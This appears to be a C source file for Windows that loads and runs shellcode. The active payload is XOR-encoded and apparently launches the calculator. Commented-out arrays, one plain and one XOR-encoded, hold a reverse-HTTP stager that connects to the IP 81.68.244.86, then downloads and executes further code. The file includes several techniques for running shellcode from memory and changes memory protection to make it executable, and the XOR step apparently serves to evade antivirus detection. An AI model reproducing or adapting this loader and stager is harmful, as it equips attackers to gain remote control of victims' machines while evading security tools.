#include<stdio.h>
#include<Windows.h>

//#define ENCODE

#define INIT_CODEBUFFER(s) { sizeof(s), s }
typedef struct _CodeBuffer
{
	SIZE_T BufferSize;
	BYTE* pBuffer;

}CodeBuffer;

/*
BYTE shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31"	//¼ÆËãÆ÷
				   "\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52"
				   "\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
				   "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1"
				   "\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52"
				   "\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
				   "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b"
				   "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b"
				   "\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
				   "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b"
				   "\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3"
				   "\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
				   "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
				   "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
				   "\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
				   "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5"
				   "\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d"
				   "\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
				   "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff"
				   "\xd5\x63\x61\x6c\x63\x00";
*/
BYTE shellcode[] = { 0x91,0x85,0xe4,0x6d,0x6d,0x6d,0xd,0xe4,0x88,0x5c,0xbf,0x9,0xe6,0x3f,0x5d,0xe6,0x3f,0x61,0xe6,0x3f,0x79,0xe6,0x1f,0x45,0x62,0xda,0x27,0x4b,0x5c,0x92,0x5c,0xad,0xc1,0x51,0xc,0x11,0x6f,0x41,0x4d,0xac,0xa2,0x60,0x6c,0xaa,0x8f,0x9d,0x3f,0x3a,0xe6,0x3f,0x7d,0xe6,0x2f,0x51,0x6c,0xbd,0xe6,0x2d,0x15,0xe8,0xad,0x19,0x27,0x6c,0xbd,0x3d,0xe6,0x25,0x75,0xe6,0x35,0x4d,0x6c,0xbe,0x8e,0x51,0x24,0xe6,0x59,0xe6,0x6c,0xbb,0x5c,0x92,0x5c,0xad,0xc1,0xac,0xa2,0x60,0x6c,0xaa,0x55,0x8d,0x18,0x99,0x6e,0x10,0x95,0x56,0x10,0x49,0x18,0x8f,0x35,0xe6,0x35,0x49,0x6c,0xbe,0xb,0xe6,0x61,0x26,0xe6,0x35,0x71,0x6c,0xbe,0xe6,0x69,0xe6,0x6c,0xbd,0xe4,0x29,0x49,0x49,0x36,0x36,0xc,0x34,0x37,0x3c,0x92,0x8d,0x35,0x32,0x37,0xe6,0x7f,0x86,0xeb,0x30,0x7,0x6c,0xe0,0xe8,0xd4,0x6d,0x6d,0x6d,0x3d,0x5,0x5c,0xe6,0x2,0xea,0x92,0xb8,0xd6,0x9d,0xd8,0xcf,0x3b,0x5,0xcb,0xf8,0xd0,0xf0,0x92,0xb8,0x51,0x6b,0x11,0x67,0xed,0x96,0x8d,0x18,0x68,0xd6,0x2a,0x7e,0x1f,0x2,0x7,0x6d,0x3e,0x92,0xb8,0xe,0xc,0x1,0xe,0x6d,0x6d };

///////////////////////////////////////////////////
/* length: 797 bytes */
//unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x34\x26\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x4d\x72\x4e\x4f\x00\x44\xfd\x37\xe1\x8b\x7c\x16\x80\xb8\x52\x78\xa9\x9f\xe2\x14\x86\x6a\x60\x16\x66\x66\x93\x2a\xea\x47\x9d\x6d\xbb\x97\x90\x76\xf5\xaa\xfe\xd2\x22\x61\xd0\x18\x55\x0f\x69\xb5\x8f\x69\xac\x13\x96\xc7\x01\x20\x55\x2e\xee\x55\x9f\x77\x1d\x58\x3a\x25\xb7\x17\xae\xa9\xec\xb5\x71\xb6\xe9\x51\xc9\x52\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xf4\xc6\x32\x49\x8a\x6d\x0f\x39\x97\x0d\x57\xea\xed\x5e\xa9\xfc\x85\x0e\x15\x95\xd8\xf8\x6c\x08\x67\xfc\xbb\x03\x9c\x8e\x3b\xd0\xe8\x85\xc5\x0d\x6b\x23\x4f\x6d\x19\x7c\x18\x99\xd6\x65\x8e\xc3\x81\xd8\x84\x4c\xd0\x93\x9e\x7a\xb2\xed\xee\xaf\xf8\x08\x01\xd3\x45\xc0\x45\x0f\xa9\x33\xdb\x09\x27\xd3\x94\x07\xb3\x51\x85\xa3\x7a\x13\x92\x30\x24\x71\x47\x00\x65\x5f\x6e\x7b\x46\x7e\xc1\x0a\xe1\xfc\x6f\x90\x92\x4c\xea\x32\x2e\x7f\x46\x4d\x2f\xca\xc5\x28\x2d\x3c\xe5\xd4\x11\xf9\x7f\xfe\x24\x3a\x61\x2e\x55\x85\xd8\xf5\x75\xf6\x7f\xc7\xdd\x9a\x2d\x1a\xbb\xfc\x31\x9b\x52\xe1\x7b\x7a\xb6\xbc\x87\x8a\x8f\x05\xde\xe4\x51\x8a\x0f\x90\x37\xee\xe1\x62\xcb\x92\x2b\x98\x91\x5f\x6d\xdd\x32\x72\x22\x4d\x92\x1b\x2d\x69\xb8\x54\x8b\x92\x4c\x43\x14\xf7\xb6\x67\x96\x1c\x68\x82\xf6\x00\x6b\x88\x12\x0e\x24\x76\x37\x08\xee\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x38\x31\x2e\x36\x38\x2e\x32\x34\x34\x2e\x38\x36\x00\x12\x34\x56\x78";

//unsigned char shellcode[] = { 0x91,0x85,0xe4,0x6d,0x6d,0x6d,0xd,0xe4,0x88,0x5c,0xbf,0x9,0xe6,0x3f,0x5d,0xe6,0x3f,0x61,0xe6,0x3f,0x79,0xe6,0x1f,0x45,0x62,0xda,0x27,0x4b,0x5c,0x92,0x5c,0xad,0xc1,0x51,0xc,0x11,0x6f,0x41,0x4d,0xac,0xa2,0x60,0x6c,0xaa,0x8f,0x9d,0x3f,0x3a,0xe6,0x3f,0x7d,0xe6,0x2f,0x51,0x6c,0xbd,0xe6,0x2d,0x15,0xe8,0xad,0x19,0x27,0x6c,0xbd,0x3d,0xe6,0x25,0x75,0xe6,0x35,0x4d,0x6c,0xbe,0x8e,0x51,0x24,0xe6,0x59,0xe6,0x6c,0xbb,0x5c,0x92,0x5c,0xad,0xc1,0xac,0xa2,0x60,0x6c,0xaa,0x55,0x8d,0x18,0x99,0x6e,0x10,0x95,0x56,0x10,0x49,0x18,0x8f,0x35,0xe6,0x35,0x49,0x6c,0xbe,0xb,0xe6,0x61,0x26,0xe6,0x35,0x71,0x6c,0xbe,0xe6,0x69,0xe6,0x6c,0xbd,0xe4,0x29,0x49,0x49,0x36,0x36,0xc,0x34,0x37,0x3c,0x92,0x8d,0x35,0x32,0x37,0xe6,0x7f,0x86,0xeb,0x30,0x5,0x3,0x8,0x19,0x6d,0x5,0x1a,0x4,0x3,0x4,0x39,0x5,0x21,0x1a,0x4b,0x6a,0x92,0xb8,0x5c,0x92,0x3a,0x3a,0x3a,0x3a,0x3a,0x5,0x57,0x3b,0x14,0xca,0x92,0xb8,0x84,0xe9,0x6d,0x6d,0x6d,0x36,0x5c,0xa4,0x3c,0x3c,0x7,0x6e,0x3c,0x3c,0x5,0x59,0x4b,0x6d,0x6d,0x3e,0x3d,0x5,0x3a,0xe4,0xf2,0xab,0x92,0xb8,0x86,0x1d,0x36,0x5c,0xbf,0x3f,0x5,0x6d,0x6f,0x2d,0xe9,0x3f,0x3f,0x3f,0x3e,0x3f,0x3d,0x5,0x86,0x38,0x43,0x56,0x92,0xb8,0xe4,0xab,0xee,0xae,0x3d,0x5c,0x92,0x3a,0x3a,0x7,0x92,0x3e,0x3b,0x5,0x40,0x6b,0x75,0x16,0x92,0xb8,0xe8,0xad,0x62,0xe9,0xae,0x6c,0x6d,0x6d,0x5c,0x92,0xe8,0x9b,0x19,0x69,0xe4,0x94,0x86,0x64,0x5,0xc7,0xa8,0x8f,0x30,0x92,0xb8,0xe4,0xac,0x5,0x28,0x4c,0x33,0x5c,0x92,0xb8,0x5c,0x92,0x3a,0x7,0x6a,0x3c,0x3b,0x3d,0x5,0xda,0x3a,0x8d,0x66,0x92,0xb8,0xd2,0x6d,0x42,0x6d,0x6d,0x54,0xaa,0x19,0xda,0x5c,0x92,0x84,0xfc,0x6c,0x6d,0x6d,0x84,0xa4,0x6c,0x6d,0x6d,0x85,0xe6,0x92,0x92,0x92,0x42,0x20,0x1f,0x23,0x22,0x6d,0x29,0x90,0x5a,0x8c,0xe6,0x11,0x7b,0xed,0xd5,0x3f,0x15,0xc4,0xf2,0x8f,0x79,0xeb,0x7,0xd,0x7b,0xb,0xb,0xfe,0x47,0x87,0x2a,0xf0,0x0,0xd6,0xfa,0xfd,0x1b,0x98,0xc7,0x93,0xbf,0x4f,0xc,0xbd,0x75,0x38,0x62,0x4,0xd8,0xe2,0x4,0xc1,0x7e,0xfb,0xaa,0x6c,0x4d,0x38,0x43,0x83,0x38,0xf2,0x1a,0x70,0x35,0x57,0x48,0xda,0x7a,0xc3,0xc4,0x81,0xd8,0x1c,0xdb,0x84,0x3c,0xa4,0x3f,0x6d,0x38,0x1e,0x8,0x1f,0x40,0x2c,0xa,0x8,0x3,0x19,0x57,0x4d,0x20,0x2,0x17,0x4,0x1,0x1,0xc,0x42,0x58,0x43,0x5d,0x4d,0x45,0xe,0x2,0x0,0x1d,0xc,0x19,0x4,0xf,0x1,0x8,0x56,0x4d,0x20,0x3e,0x24,0x28,0x4d,0x54,0x43,0x5d,0x56,0x4d,0x3a,0x4,0x3,0x9,0x2,0x1a,0x1e,0x4d,0x23,0x39,0x4d,0x5b,0x43,0x5c,0x56,0x4d,0x3a,0x4,0x3,0x5b,0x59,0x56,0x4d,0x15,0x5b,0x59,0x56,0x4d,0x39,0x1f,0x4,0x9,0x8,0x3,0x19,0x42,0x58,0x43,0x5d,0x56,0x4d,0x2f,0x22,0x24,0x28,0x54,0x56,0x28,0x23,0x38,0x3e,0x44,0x60,0x67,0x6d,0x99,0xab,0x5f,0x24,0xe7,0x0,0x62,0x54,0xfa,0x60,0x3a,0x87,0x80,0x33,0xc4,0x91,0xe8,0x63,0x78,0xf8,0xb5,0x95,0x1,0x65,0xa,0x91,0xd6,0x6e,0xf1,0xe3,0x56,0xbd,0x85,0xe8,0xa8,0x60,0x6,0x4e,0x22,0x0,0x74,0x11,0x75,0xf4,0xbb,0x8,0xe3,0xae,0xec,0xb5,0xe9,0x21,0xbd,0xfe,0xf3,0x17,0xdf,0x80,0x83,0xc2,0x95,0x65,0x6c,0xbe,0x28,0xad,0x28,0x62,0xc4,0x5e,0xb6,0x64,0x4a,0xbe,0xf9,0x6a,0xde,0x3c,0xe8,0xce,0x17,0x7e,0xff,0x5d,0x49,0x1c,0x2a,0x6d,0x8,0x32,0x3,0x16,0x2b,0x13,0xac,0x67,0x8c,0x91,0x2,0xfd,0xff,0x21,0x87,0x5f,0x43,0x12,0x2b,0x20,0x42,0xa7,0xa8,0x45,0x40,0x51,0x88,0xb9,0x7c,0x94,0x12,0x93,0x49,0x57,0xc,0x43,0x38,0xe8,0xb5,0x98,0x18,0x9b,0x12,0xaa,0xb0,0xf7,0x40,0x77,0xd6,0x91,0x5c,0xf6,0x3f,0x8c,0x16,0x17,0xdb,0xd1,0xea,0xe7,0xe2,0x68,0xb3,0x89,0x3c,0xe7,0x62,0xfd,0x5a,0x83,0x8c,0xf,0xa6,0xff,0x46,0xf5,0xfc,0x32,0x0,0xb0,0x5f,0x1f,0x4f,0x20,0xff,0x76,0x40,0x4,0xd5,0x39,0xe6,0xff,0x21,0x2e,0x79,0x9a,0xdb,0xa,0xfb,0x71,0x5,0xef,0x9b,0x6d,0x6,0xe5,0x7f,0x63,0x49,0x1b,0x5a,0x65,0x83,0x6d,0x5,0x9d,0xd8,0xcf,0x3b,0x92,0xb8,0x7,0x2d,0x5,0x6d,0x7d,0x6d,0x6d,0x5,0x6d,0x6d,0x2d,0x6d,0x3a,0x5,0x35,0xc9,0x3e,0x88,0x92,0xb8,0xfe,0xd4,0x6d,0x6d,0x6d,0x6d,0x6c,0xb4,0x3c,0x3e,0xe4,0x8a,0x3a,0x5,0x6d,0x4d,0x6d,0x6d,0x3e,0x3b,0x5,0x7f,0xfb,0xe4,0x8f,0x92,0xb8,0xe8,0xad,0x19,0xab,0xe6,0x6a,0x6c,0xae,0xe8,0xad,0x18,0x88,0x35,0xae,0x85,0xc4,0x90,0x92,0x92,0x55,0x5c,0x43,0x5b,0x55,0x43,0x5f,0x59,0x59,0x43,0x55,0x5b,0x6d,0x7f,0x59,0x3b,0x15,0x6d };

///////////////////////////////////////////////////

typedef void(__stdcall* CODE) ();

void recoder()
{

	for (size_t i = 0; i < sizeof(shellcode); i++)
	{
#ifdef ENCODE
		shellcode[i] ^= 97;
		shellcode[i] ^= 12;
		printf("0x%x,", shellcode[i]);
#endif
		shellcode[i] ^= 12;
		shellcode[i] ^= 97;
		//printf("0x%x,", shellcode[i]);
	}
	putchar('\n');
}

bool ChangePageProtect(CodeBuffer Buffer)
{
	DWORD OldProtect = 0;
	VirtualProtect(Buffer.pBuffer, Buffer.BufferSize, PAGE_EXECUTE_READWRITE, &OldProtect);
	return TRUE;
}

typedef void(__stdcall* CODE) ();

void RunShellCode_1()
{

	PVOID pBuffer = NULL;
	pBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pBuffer == NULL)
	{
		return;
	}
	memcpy(pBuffer, shellcode, sizeof(shellcode));

	CODE code = (CODE)pBuffer;

	code();

}

void RunShellCode_2()
{
	((void(*)(void)) & shellcode)();
}


#ifdef _WIN32
void RunShellCode_3()
{
	__asm
	{
		lea eax, shellcode;
		jmp eax;
	}
}

void RunShellCode_4()
{
	__asm
	{
		mov eax, offset shellcode;
		_emit 0xFF;	
		_emit 0xE0;
	}
}

#else

#endif
int main()
{
	recoder();
	
#ifndef ENCODE
	//RunShellCode_1();
	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
	ChangePageProtect(Buffer);
	RunShellCode_2();
	//RunShellCode_3();
	//RunShellCode_4();
	//RunShellCode_5();
#endif
	return 0;
}